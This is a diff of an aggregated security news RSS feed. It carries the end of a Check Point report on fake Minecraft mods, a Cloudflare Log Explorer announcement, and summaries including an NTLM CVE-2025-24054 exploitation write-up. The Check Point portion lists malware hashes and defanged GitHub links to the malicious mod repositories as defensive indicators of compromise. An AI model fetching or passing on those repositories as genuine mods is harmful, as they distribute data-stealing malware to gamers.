3&lt;/td&gt;&lt;td&gt;7aefd6442b09e37aa287400825f81b2ff896b9733328814fb7233978b104127f&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;stage 3&lt;/td&gt;&lt;td&gt;886a694ee4be77242f501b20d37395e1a8a7a8f734f460cae269eb1309c5b196&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;stage 3&lt;/td&gt;&lt;td&gt;a1dc479898f0798e40f63b9c1a7ee4649357abdc757c53d4a81448a5eea9169f&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;stage 3&lt;/td&gt;&lt;td&gt;a427eeb8eed4585f2d51b62528b8b4920e72002ab62eb6fc19289ebc2fba5660&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;stage 3&lt;/td&gt;&lt;td&gt;f08086257c74b1de394bf150ad8aacc99ca5de57b4baa0974bc1b59bb973d355&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;stage 3&lt;/td&gt;&lt;td&gt;a1dc479898f0798e40f63b9c1a7ee4649357abdc757c53d4a81448a5eea9169f&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;stage 3&lt;/td&gt;&lt;td&gt;886a694ee4be77242f501b20d37395e1a8a7a8f734f460cae269eb1309c5b196&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;GitHub Repositories&lt;/td&gt;&lt;td&gt;hxxps://github[.]com/A1phaD3v/Oringo-Client&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+
+
+&lt;p&gt;hxxps://github[.]com/AlphaPigeonDev/Polar-Client hxxps://github[.]com/AlphaPigeonDev/Skyblock-Extras hxxps://github[.]com/P1geonD3v/Funny-Map-Extras hxxps://github[.]com/P1geonD3v/Taunahi-V3 | | | | | | |&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/minecraft-mod-malware-stargazers/"&gt;Fake Minecraft mods distributed by the Stargazers Ghost Network to steal gamers’ data&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://research.checkpoint.com/?p=31533</guid><category>Check Point Research Publications</category></item><item><title>Cloudflare Log Explorer is now GA, providing native observability and forensics</title><link>https://blog.cloudflare.com/logexplorer-ga/</link><description>We are happy to announce the General Availability of Cloudflare Log Explorer, a powerful product designed to bring observability and forensics capabilities directly into your Cloudflare dashboard.</description><content:encoded>&lt;p&gt;We are thrilled to announce the General Availability of &lt;a href="http://cloudflare.com/application-services/products/log-explorer/"&gt;&lt;u&gt;Cloudflare Log Explorer&lt;/u&gt;&lt;/a&gt;, a powerful new product designed to bring observability and forensics capabilities directly into your Cloudflare dashboard. Built on the foundation of Cloudflare's vast &lt;a href="https://www.cloudflare.com/network/"&gt;&lt;u&gt;global network&lt;/u&gt;&lt;/a&gt;, Log Explorer leverages the unique position of our platform to provide a comprehensive and contextualized view of your environment.&lt;/p&gt;&lt;p&gt;Security teams and developers use Cloudflare to detect and mitigate threats in real-time and to optimize application performance. Over the years, users have asked for additional telemetry with full context to investigate security incidents or troubleshoot application performance issues without having to forward data to third party log analytics and Security Information and Event Management (SIEM) tools. Besides avoidable costs, forwarding data externally comes with other drawbacks such as: complex setups, delayed access to crucial data, and a frustrating lack of context that complicates quick mitigation. &lt;/p&gt;&lt;p&gt;Log Explorer has been previewed by several hundred customers over the last year, and they attest to its benefits: &lt;/p&gt;&lt;blockquote&gt;&lt;p&gt;&lt;i&gt;“Having WAF logs (firewall events) instantly available in Log Explorer with full context — no waiting, no external tools — has completely changed how we manage our firewall rules. I can spot an issue, adjust the rule with a single click, and immediately see the effect. It’s made tuning for false positives faster, cheaper, and far more effective.” &lt;/i&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;blockquote&gt;&lt;p&gt;&lt;i&gt;“While we use Logpush to ingest Cloudflare logs into our SIEM, when our development team needs to analyze logs, it can be more effective to utilize &lt;/i&gt;&lt;b&gt;&lt;i&gt;Log Explorer&lt;/i&gt;&lt;/b&gt;&lt;i&gt;. SIEMs make it difficult for development teams to write their own queries and manipulate the console to see the logs they need. Cloudflare's Log Explorer, on the other hand, makes it much &lt;/i&gt;&lt;b&gt;&lt;i&gt;easier&lt;/i&gt;&lt;/b&gt;&lt;i&gt; for dev teams to look at logs and directly search for the information they need.”&lt;/i&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;With Log Explorer, customers have access to Cloudflare logs with all the context available within the Cloudflare platform. Compared to external tools, customers benefit from: &lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Reduced cost and complexity:&lt;/b&gt; Drastically reduce the expense and operational overhead associated with forwarding, storing, and analyzing terabytes of log data in external tools.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Faster detection and triage:&lt;/b&gt; Access Cloudflare-native logs directly, eliminating cumbersome data pipelines and the ingest lags that delay critical security insights.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Accelerated investigations with full context:&lt;/b&gt; Investigate incidents with Cloudflare's unparalleled contextual data, accelerating your analysis and understanding of "What exactly happened?" and "How did it happen?"&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Minimal recovery time:&lt;/b&gt; Seamlessly transition from investigation to action with direct mitigation capabilities via the Cloudflare platform.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Log Explorer is available as an add-on product for customers on our self serve or Enterprise plans. Read on to learn how each of the capabilities of Log Explorer can help you detect and diagnose issues more quickly.&lt;/p&gt;
+          &lt;div&gt;
+            &lt;h3&gt;Monitor security and performance issues with custom dashboards&lt;/h3&gt;
+            &lt;a href="https://blog.cloudflare.com/tag/security/rss#monitor-security-and-performance-issues-with-custom-dashboards"&gt;
+              
+            &lt;/a&gt;
+          &lt;/div&gt;
+        &lt;p&gt;Custom dashboards allow you to define the specific metrics you need in order to monitor unusual or unexpected activity in your environment.&lt;/p&gt;&lt;p&gt;Getting started is easy, with the ability to create a chart using natural language. A natural language interface is integrated into the chart create/edit experience, enabling you to describe in your own words the chart you want to create. Similar to the &lt;a href="https://blog.cloudflare.com/security-analytics-ai-assistant/"&gt;&lt;u&gt;AI Assistant we announced during Security Week 2024&lt;/u&gt;&lt;/a&gt;, the prompt translates your language to the appropriate chart configuration, which can then be added to a new or existing custom dashboard.&lt;/p&gt;&lt;p&gt;As an example, you can create a dashboard for monitoring for the presence of Remote Code Execution (RCE) attacks happening in your environment. An RCE attack is where an attacker is able to compromise a machine in your environment and execute commands. The good news is that RCE is a detection available in Cloudflare WAF.  In the dashboard example below, you can not only watch for RCE attacks, but also correlate them with other security events such as malicious content uploads, source IP addresses, and JA3/JA4 fingerprints. Such a scenario could mean one or more machines in your environment are compromised and being used to spread malware — surely, a very high risk incident!&lt;/p&gt;
+          &lt;figure&gt;
+          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/1UWOHhIaIFiBTtnohdvbAx/40eeac0b52bc278d0687f7d48cd875fd/BLOG-2838_2.png" /&gt;
+          &lt;/figure&gt;&lt;p&gt;A reliability engineer might want to create a dashboard for monitoring errors. They could use the natural language prompt to enter a query like “Compare HTTP status code ranges over time.” The AI model then decides the most appropriate visualization and constructs their chart configuration.&lt;/p&gt;&lt;p&gt;While you can create custom dashboards from scratch, you could also use an expert-curated dashboard template to jumpstart your security and performance monitoring. &lt;/p&gt;&lt;p&gt;Available templates include: &lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Bot monitoring:&lt;/b&gt; Identify automated traffic accessing your website&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;API Security:&lt;/b&gt; Monitor the data transfer and exceptions of API endpoints within your application&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;API Performance:&lt;/b&gt; See timing data for API endpoints in your application, along with error rates&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Account Takeover: &lt;/b&gt;View login attempts, usage of leaked credentials, and identify account takeover attacks&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Performance Monitoring:&lt;/b&gt; Identify slow hosts and paths on your origin server, and view &lt;a href="https://blog.cloudflare.com/ttfb-is-not-what-it-used-to-be/"&gt;time to first byte (TTFB)&lt;/a&gt; metrics over time&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Security Monitoring:&lt;/b&gt; monitor attack distribution across top hosts and paths, correlate DDoS traffic with origin Response time to understand the impact of DDoS attacks.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;
+          &lt;figure&gt;
+          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/3PO726Rhjol9khGOdMMnQJ/55462052782974b0fc5b0c885e42e41b/BLOG-2838_3.png" /&gt;
+          &lt;/figure&gt;
+          &lt;div&gt;
+            &lt;h3&gt;Investigate and troubleshoot issues with Log Search &lt;/h3&gt;
+            &lt;a href="https://blog.cloudflare.com/tag/security/rss#investigate-and-troubleshoot-issues-with-log-search"&gt;
+              
+            &lt;/a&gt;
+          &lt;/div&gt;
+        &lt;p&gt;Continuing with the example from the prior section, after successfully diagnosing that some machines were compromised through the RCE issue, analysts can pivot over to Log Search in order to investigate whether the attacker was able to access and compromise other internal systems. To do that, the analyst could search logs from Zero Trust services, using context, such as compromised IP addresses from the custom dashboard, shown in the screenshot below: &lt;/p&gt;
+          &lt;figure&gt;
+          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/4iPrTc1ZtLU4ZxQWojvmje/d09bb0bf25bd17cea1d2f955371d991e/BLOG-2838_4.png" /&gt;
+          &lt;/figure&gt;&lt;p&gt;Log Search is a streamlined experience including data type-aware search filters, or the ability to switch to a custom SQL interface for more powerful queries. Log searches are also available via a &lt;a href="https://developers.cloudflare.com/log-explorer/"&gt;&lt;u&gt;public API&lt;/u&gt;&lt;/a&gt;. &lt;/p&gt;
+          &lt;figure&gt;
+          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/4AytV9wASU5kUuThnhl0CQ/de8c9f4b829e1ccfebdb33bd9522ae5b/BLOG-2838_5.png" /&gt;
+          &lt;/figure&gt;
+          &lt;div&gt;
+            &lt;h3&gt;Save time and collaborate with saved queries&lt;/h3&gt;
+            &lt;a href="https://blog.cloudflare.com/tag/security/rss#save-time-and-collaborate-with-saved-queries"&gt;
+              
+            &lt;/a&gt;
+          &lt;/div&gt;
+        &lt;p&gt;Queries built in Log Search can now be saved for repeated use and are accessible to other Log Explorer users in your account. This makes it easier than ever to investigate issues together. &lt;/p&gt;
+          &lt;figure&gt;
+          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/4ouInu3nk7iZnAcJAs39F8/cc7ca6a61d19d3d9c1371ad2ca87e913/BLOG-2838_6.png" /&gt;
+          &lt;/figure&gt;
+          &lt;div&gt;
+            &lt;h3&gt;Monitor proactively with Custom Alerting (coming soon)&lt;/h3&gt;
+            &lt;a href="https://blog.cloudflare.com/tag/security/rss#monitor-proactively-with-custom-alerting-coming-soon"&gt;
+              
+            &lt;/a&gt;
+          &lt;/div&gt;
+        &lt;p&gt;With custom alerting, you can configure custom alert policies in order to proactively monitor the indicators that are important to your business. &lt;/p&gt;&lt;p&gt;Starting from Log Search, define and test your query. From here you can opt to save and configure a schedule interval and alerting policy. The query will run automatically on the schedule you define.&lt;/p&gt;&lt;h4&gt;Tracking error rate for a customhostname&lt;/h4&gt;&lt;p&gt;If you want to monitor the error rate for a particular host, you can use this Log Search query to calculate the error rate per time interval:&lt;/p&gt;
+            &lt;pre&gt;&lt;code&gt;SELECT SUBSTRING(EdgeStartTimeStamp, 1, 14) || '00:00' AS time_interval,
+       COUNT() AS total_requests,
+       COUNT(CASE WHEN EdgeResponseStatus &amp;gt;= 500 THEN 1 ELSE NULL END) AS error_requests,
+       COUNT(CASE WHEN EdgeResponseStatus &amp;gt;= 500 THEN 1 ELSE NULL END) * 100.0 / COUNT() AS error_rate_percentage
+ FROM http_requests
+WHERE EdgeStartTimestamp &amp;gt;= '2025-06-09T20:56:58Z'
+  AND EdgeStartTimestamp &amp;lt;= '2025-06-10T21:26:58Z'
+  AND ClientRequestHost = 'customhostname.com'
+GROUP BY time_interval
+ORDER BY time_interval ASC;
+&lt;/code&gt;&lt;/pre&gt;
+            &lt;p&gt;Running the above query returns the following results. You can see the overall error rate percentage in the far right column of the query results.&lt;/p&gt;
+          &lt;figure&gt;
+          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5v8SNmHt4OJrLSkiM2EKtJ/182c7f5709eef1fbb9e93c5423fc1bae/BLOG-2838_7.png" /&gt;
+          &lt;/figure&gt;&lt;h4&gt;Proactively detect malware&lt;/h4&gt;&lt;p&gt;We can identify malware in the environment by monitoring logs from &lt;a href="https://developers.cloudflare.com/cloudflare-one/policies/gateway/"&gt;&lt;u&gt;Cloudflare Secure Access Gateway&lt;/u&gt;&lt;/a&gt;. As an example, &lt;a href="https://www.broadcom.com/support/security-center/protection-bulletin/new-katz-stealer-malware-as-a-service-compromises-web-browsers"&gt;&lt;u&gt;Katz Stealer&lt;/u&gt;&lt;/a&gt; is malware-as-a-service designed for stealing credentials. We can monitor DNS queries and HTTP requests from users within the company in order to identify any machines that may be infected with Katz Stealer malware. &lt;/p&gt;
+          &lt;figure&gt;
+          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/7jgBTCWYpnWoNrFh8xe6ki/306e644ec3753976315c16c9d1560eec/BLOG-2838_8.png" /&gt;
+          &lt;/figure&gt;
+          &lt;figure&gt;
+          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/7jFwBxsk8rfD3VLAYkG2iA/ebd2ebcd95d12b40978f22bf1bc7be39/BLOG-2838_9.png" /&gt;
+          &lt;/figure&gt;&lt;p&gt;And with custom alerts, you can configure an alert policy so that you can be notified via webhook or PagerDuty.&lt;/p&gt;
+          &lt;div&gt;
+            &lt;h3&gt;Maintain audit &amp;amp; compliance with flexible retention (coming soon)&lt;/h3&gt;
+            &lt;a href="https://blog.cloudflare.com/tag/security/rss#maintain-audit-compliance-with-flexible-retention-coming-soon"&gt;
+              
+            &lt;/a&gt;
+          &lt;/div&gt;
+        &lt;p&gt;With flexible retention, you can set the precise length of time you want to store your logs, allowing you to meet specific compliance and audit requirements with ease. Other providers require archiving or hot and cold storage, making it difficult to query older logs. Log Explorer is built on top of our R2 storage tier, so historical logs can be queried as easily as current logs. &lt;/p&gt;
+          &lt;div&gt;
+            &lt;h3&gt;How we built Log Explorer to run at Cloudflare scale&lt;/h3&gt;
+            &lt;a href="https://blog.cloudflare.com/tag/security/rss#how-we-built-log-explorer-to-run-at-cloudflare-scale"&gt;
+              
+            &lt;/a&gt;
+          &lt;/div&gt;
+        &lt;p&gt;With Log Explorer, we have built a scalable log storage platform on top of &lt;a href="https://www.cloudflare.com/developer-platform/products/r2/"&gt;&lt;u&gt;Cloudflare R2&lt;/u&gt;&lt;/a&gt; that lets you efficiently search your Cloudflare logs using familiar SQL queries. In this section, we’ll look into how we did this and how we solved some technical challenges along the way.
+
+Log Explorer consists of three components: ingestors, compactors, and queriers. Ingestors are responsible for writing logs from Cloudflare’s data pipeline to R2. Compactors optimize storage files, so they can be queried more efficiently. Queriers execute SQL queries from users by fetching, transforming, and aggregating matching logs from R2.&lt;/p&gt;
+          &lt;figure&gt;
+          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/1qEH0futV2are5GnT6vjta/e50c0ec4bbb1cacada117d31b71502e2/BLOG-2838_10.png" /&gt;
+          &lt;/figure&gt;&lt;p&gt;During ingestion, Log Explorer writes each batch of log records to a Parquet file in R2. &lt;a href="https://parquet.apache.org/"&gt;&lt;u&gt;Apache Parquet&lt;/u&gt;&lt;/a&gt; is an open-source columnar storage file format, and it was an obvious choice for us: it’s optimized for efficient data storage and retrieval, such as by embedding metadata like the minimum and maximum values of each column across the file which enables the queriers to quickly locate the data needed to serve the query.&lt;/p&gt;&lt;p&gt;Log Explorer stores logs on a per-customer level, just like Cloudflare D1, so that your data isn't mixed with that of other customers. In Q3 2025, per-customer logs will allow you the flexibility to create your own retention policies and decide in which regions you want to store your data.
+
+But how does Log Explorer find those Parquet files when you query your logs? Log Explorer leverages the &lt;a href="https://databricks.com/wp-content/uploads/2020/08/p975-armbrust.pdf"&gt;&lt;u&gt;Delta Lake&lt;/u&gt;&lt;/a&gt; open table format to provide a database table abstraction atop R2 object storage. A table in Delta Lake pairs data files in Parquet format with a transaction log. The transaction log registers every addition, removal, or modification of a data file for the table – it’s stored right next to the data files in R2.&lt;/p&gt;&lt;p&gt;Given a SQL query for a particular log dataset such as &lt;a href="https://developers.cloudflare.com/logs/reference/log-fields/zone/http_requests/"&gt;&lt;u&gt;HTTP Requests&lt;/u&gt;&lt;/a&gt; or &lt;a href="https://developers.cloudflare.com/logs/reference/log-fields/account/gateway_dns/"&gt;&lt;u&gt;Gateway DNS&lt;/u&gt;&lt;/a&gt;, Log Explorer first has to load the transaction log of the corresponding Delta table from R2. Transaction logs are checkpointed periodically to avoid having to read the entire table history every time a user queries their logs.&lt;/p&gt;&lt;p&gt;Besides listing Parquet files for a table, the transaction log also includes per-column min/max statistics for each Parquet file. This has the benefit that Log Explorer only needs to fetch files from R2 that can possibly satisfy a user query. Finally, queriers use the min/max statistics embedded in each Parquet file to decide which row groups to fetch from the file.&lt;/p&gt;&lt;p&gt;Log Explorer processes SQL queries using &lt;a href="https://arrow.apache.org/datafusion/"&gt;&lt;u&gt;Apache DataFusion&lt;/u&gt;&lt;/a&gt;, a fast, extensible query engine written in Rust, and &lt;a href="https://github.com/delta-io/delta-rs"&gt;&lt;u&gt;delta-rs&lt;/u&gt;&lt;/a&gt;, a community-driven Rust implementation of the Delta Lake protocol. While standing on the shoulders of giants, our team had to solve some unique problems to provide log search at Cloudflare scale.&lt;/p&gt;&lt;p&gt;Log Explorer ingests logs from across Cloudflare’s vast global network, &lt;a href="https://www.cloudflare.com/network"&gt;&lt;u&gt;spanning more than 330 cities in over 125 countries&lt;/u&gt;&lt;/a&gt;. If Log Explorer were to write logs from our servers straight to R2, its storage would quickly fragment into a myriad of small files, rendering log queries prohibitively expensive.&lt;/p&gt;&lt;p&gt;Log Explorer’s strategy to avoid this fragmentation is threefold. First, it leverages Cloudflare’s data pipeline, which collects and batches logs from the edge, ultimately buffering each stream of logs in an internal system named &lt;a href="https://blog.cloudflare.com/cloudflare-incident-on-november-14-2024-resulting-in-lost-logs/"&gt;&lt;u&gt;Buftee&lt;/u&gt;&lt;/a&gt;. Second, log batches ingested from Buftee aren’t immediately committed to the transaction log; rather, Log Explorer stages commits for multiple batches in an intermediate area and “squashes” these commits before they’re written to the transaction log. Third, once log batches have been committed, a process called compaction merges them into larger files in the background.&lt;/p&gt;&lt;p&gt;While the open-source implementation of Delta Lake provides compaction out of the box, we soon encountered an issue when using it for our workloads. Stock compaction merges data files to a desired target size S by sorting the files in reverse order of their size and greedily filling bins of size S with them. By merging logs irrespective of their timestamps, this process distributed ingested batches randomly across merged files, destroying data locality. Despite compaction, a user querying for a specific time frame would still end up fetching hundreds or thousands of files from R2.&lt;/p&gt;&lt;p&gt;For this reason, we wrote a custom compaction algorithm that merges ingested batches in order of their minimum log timestamp, leveraging the min/max statistics mentioned previously. This algorithm reduced the number of overlaps between merged files by two orders of magnitude. As a result, we saw a significant improvement in query performance, with some large queries that had previously taken over a minute completing in just a few seconds.&lt;/p&gt;
+          &lt;div&gt;
+            &lt;h3&gt;Follow along for more updates&lt;/h3&gt;
+            &lt;a href="https://blog.cloudflare.com/tag/security/rss#follow-along-for-more-updates"&gt;
+              
+            &lt;/a&gt;
+          &lt;/div&gt;
+        &lt;p&gt;We're just getting started! We're actively working on even more powerful features to further enhance your experience with Log Explorer. &lt;a href="https://blog.cloudflare.com/"&gt;&lt;u&gt;Subscribe to the blog&lt;/u&gt;&lt;/a&gt; and keep an eye out for more updates in our &lt;a href="https://developers.cloudflare.com/changelog/"&gt;&lt;u&gt;Change Log&lt;/u&gt;&lt;/a&gt; to our observability and forensics offering soon.&lt;/p&gt;
+          &lt;div&gt;
+            &lt;h3&gt;Get access to Log Explorer&lt;/h3&gt;
+            &lt;a href="https://blog.cloudflare.com/tag/security/rss#get-access-to-log-explorer"&gt;
+              
+            &lt;/a&gt;
+          &lt;/div&gt;
+        &lt;p&gt;To get access to Log Explorer, reach out for a &lt;a href="http://cloudflare.com/product/log-explorer/"&gt;&lt;u&gt;consultation&lt;/u&gt;&lt;/a&gt; or contact your account manager. Additionally, you can read more in our &lt;a href="https://developers.cloudflare.com/logs/log-explorer/"&gt;&lt;u&gt;Developer Documentation&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;</content:encoded><guid isPermaLink="false">kg7dxMzYcRnJdVFrxQmCw</guid><category>R2 Storage</category><category>SIEM</category><category>Product News</category><category>Connectivity Cloud</category><category>Analytics</category><category>Developer Platform</category><category>Developers</category><category>Security</category></item><item><title>Business Intelligence vs Data Analytics vs Artificial Intelligence: What Are the Differences?</title><link>https://www.techrepublic.com/article/differences-bi-ai-analytics/</link><description>Defining the differences often poses a challenge to many people. This guide will help your understanding.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=3978247</guid><category>Artificial Intelligence</category><category>Big Data</category><category>Data</category><category>ai</category><category>artificial intelligence</category><category>bi</category><category>business intelligence</category><category>data analysis</category><category>data analytics</category></item><item><title>Don&amp;#x3f;t Make it Easier than it Already is&amp;#x3f;..Default Passwords &amp;#x5b;Guest Diary&amp;#x5d;, (Wed, Jun 18th)</title><link>https://isc.sans.edu/diary/rss/32054</link><description>&lt;p&gt;&amp;#x5b;This is a Guest Diary by Matthew Paul, an ISC intern as part of the SANS.edu &lt;a href="https://www.sans.edu/cyber-security-programs/bachelors-degree/"&gt;BACS&lt;/a&gt; program&amp;#x5d;&lt;/p&gt;&amp;#xd;</description><content:encoded>&lt;p&gt;[This is a Guest Diary by Matthew Paul, an ISC intern as part of the SANS.edu &lt;a href="https://www.sans.edu/cyber-security-programs/bachelors-degree/"&gt;BACS&lt;/a&gt; program]&lt;/p&gt;
 
 &lt;p&gt;Over the past few months, I&amp;rsquo;ve been working under a SANS Internet Storm Center (ISC) Sr. Handler as part of the SANS Degree Program ISC Internship.&amp;nbsp; The first objective of the internship is setting up a forward-facing honeypot on your network to review and report on log activity.&amp;nbsp;&lt;/p&gt;
 
@@ -15480,322 +16054,7 @@ Organizations should refine their threat modeling processes to explicitly accoun
 
 
 &lt;p&gt;&lt;/p&gt;
-&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/21st-april-threat-intelligence-report/"&gt;21st April – Threat Intelligence Report&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://research.checkpoint.com/?p=31405</guid><category>Global Cyber Attack Reports</category></item><item><title>Zero Day Quest 2025: $1.6 million awarded for vulnerability research</title><link>https://msrc.microsoft.com/blog/2025/04/zero-day-quest-2025-1.6-million-awarded-for-vulnerability-research/</link><description>This month, the Microsoft Security Response Center recently welcomed some of the world’s most talented security researchers at Microsoft’s Zero Day Quest, the largest live hacking competition of its kind. The inaugural event challenged the security community to focus on the highest-impact security scenarios for Copilot and Cloud with up to $4 million in potential awards.</description><guid isPermaLink="false">https://msrc.microsoft.com/blog/2025/04/zero-day-quest-2025-1.6-million-awarded-for-vulnerability-research/</guid></item><item><title>Hiring Kit: Cryptographer</title><link>https://www.techrepublic.com/resource-library/hiring-kit/cryptographer/</link><description>Hire the best cryptographer to develop algorithms, ciphers, and other encryption systems to protect sensitive data. Boost Cybersecurity – Cryptographers uses their expertise in mathematics and computer science to defend your business from threats. Streamline Hiring – Get an optimized job description, interview questions, and job advert to simplify recruitment. Expert-Crafted Framework – Written by ...</description><guid isPermaLink="false">https://www.techrepublic.com/resource-library/whitepapers/hiring-kit-cryptographer/</guid><category>Cybersecurity</category><category>Hiring Kits</category><category>HR Resources</category><category>IT Resources</category></item><item><title>Information Security Policy</title><link>https://www.techrepublic.com/resource-library/it-policy/information-security/</link><description>Safeguard company information, reduce business and legal risks, and protect company investments and reputation with this IT policy. Fully Customizable — Good to use as-is or change as you see fit. Improve Your Information Security — This 10-page document offers everything you need to create a secure environment. Expert Authorship — Created by Scott Matteson ...</description><guid isPermaLink="false">https://www.techrepublic.com/resource-library/whitepapers/information-security-policy/</guid><category>Cybersecurity</category><category>Data</category><category>IT Resources</category></item><item><title>FOG Ransomware Spread by Cybercriminals Claiming Ties to DOGE</title><link>https://www.trendmicro.com/en_us/research/25/d/fog-ransomware-concealed-within-binary-loaders-linking-themselve.html</link><description>This blog details our investigation of malware samples that conceal within them a FOG ransomware payload.</description><guid isPermaLink="false">urn:uuid:6a1f8c52-507f-6692-6e46-0869e5fc34e6</guid><category>Trend Micro Research : Articles, News, Reports</category><category>Trend Micro Research : Ransomware</category><category>Trend Micro Research : Research</category></item><item><title>16-31 December 2024 Cyber Attacks Timeline</title><link>https://www.hackmageddon.com/2025/04/18/16-31-december-2024-cyber-attacks-timeline/</link><description>In the second timeline of December 2024, I collected 94 events with a threat landscape dominated by malware with...</description><guid isPermaLink="false">https://www.hackmageddon.com/?p=44588</guid><category>Cyber Attacks Timelines</category><category>Security</category><category>2024</category><category>Cyber Attacks</category><category>Cyber Crime</category><category>Cyber Espionage</category><category>Cyber Warfare</category><category>December</category><category>Hacktivism</category><category>Malware</category><category>Phishing</category><category>Ransomware</category><category>Timeline</category></item><item><title>Disaster Recovery and Business Continuity Plan</title><link>https://www.techrepublic.com/resource-library/guide/disaster-recovery-and-business-continuity-plan/</link><description>IT pros can use this plan to create policies that address critical elements and processes that should be considered and implemented before a crisis occurs. Customizable Document — Ready for use as-is or for edits. Enhance Your Processes — This 10-page document outlines critical systems, data selection, compliance, and more. Expertly-Curated — Written by Scott ...</description><guid isPermaLink="false">https://www.techrepublic.com/resource-library/whitepapers/disaster-recovery-and-business-continuity-plan/</guid><category>Cybersecurity</category><category>IT Resources</category><category>Software</category><category>Tech &amp; Work</category></item><item><title>Possible National Security Crisis Averted: CISA’s Reversal Extends Support for CVE Database</title><link>https://www.techrepublic.com/article/news-mitre-cisa-contract-expiration-cve-database/</link><description>CISA executed the option period on MITRE’s contract to keep the essential CVE cybersecurity database running.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4302130</guid><category>Cybersecurity</category><category>International</category><category>News</category><category>bugcrowd</category><category>CISA</category><category>common vulnerabilities and exposures</category><category>common weakness enumeration</category><category>cve</category><category>cve foundation</category><category>cwe</category><category>cybersecurity</category><category>department of homeland security</category><category>incident response</category><category>mitre</category><category>vulnerability management</category></item><item><title>CVE-2025-24054, NTLM Exploit in the Wild</title><link>https://research.checkpoint.com/2025/cve-2025-24054-ntlm-exploit-in-the-wild/</link><description>&lt;p&gt;Key Points Introduction NTLM (New Technology LAN Manager) is a suite of authentication protocols developed by Microsoft to verify user identities and protect the integrity and confidentiality of network communications. NTLM operates through a direct client-server exchange known as the NTLM challenge/response mechanism, in which the server challenges the client to prove its identity without [&amp;#8230;]&lt;/p&gt;
-&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/cve-2025-24054-ntlm-exploit-in-the-wild/"&gt;CVE-2025-24054, NTLM Exploit in the Wild&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;h2 class="wp-block-heading"&gt;Key Points&lt;/h2&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;&lt;strong&gt;CVE-2025-24054&lt;/strong&gt; is a vulnerability related to &lt;strong&gt;NTLM hash disclosure via spoofing&lt;/strong&gt;, which can be exploited using a maliciously crafted &lt;code&gt;.library-ms&lt;/code&gt; file. Active exploitation in the wild has been observed since &lt;strong&gt;March 19, 2025&lt;/strong&gt;, potentially allowing attackers to leak NTLM hashes or user passwords and compromise systems. Although Microsoft released a patch on &lt;strong&gt;March 11, 2025&lt;/strong&gt;, threat actors already had over a week to develop and deploy exploits before the vulnerability began to be actively abused.&lt;/li&gt;
-
-
-
-&lt;li&gt;Around &lt;strong&gt;March 20–21, 2025&lt;/strong&gt;, a campaign targeted &lt;strong&gt;government&lt;/strong&gt; and &lt;strong&gt;private institutions&lt;/strong&gt; in &lt;strong&gt;Poland&lt;/strong&gt; and &lt;strong&gt;Romania&lt;/strong&gt;. Attackers used malspam to distribute a Dropbox link containing an archive that exploited multiple known vulnerabilities, including &lt;strong&gt;CVE-2025-24054,&lt;/strong&gt; to harvest &lt;strong&gt;NTLMv2-SSP hashes&lt;/strong&gt;.&lt;/li&gt;
-
-
-
-&lt;li&gt;Initial reports suggested that exploitation occurred once the &lt;code&gt;.library-ms&lt;/code&gt; file was unzipped. However, Microsoft’s patch documentation indicated that the vulnerability could even be triggered with minimal user interaction, such as right-clicking, dragging and dropping, or simply navigating to the folder containing the malicious file. This exploit appears to be a variant of a previously patched vulnerability, &lt;strong&gt;CVE-2024-43451&lt;/strong&gt;, as both share several similarities.&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
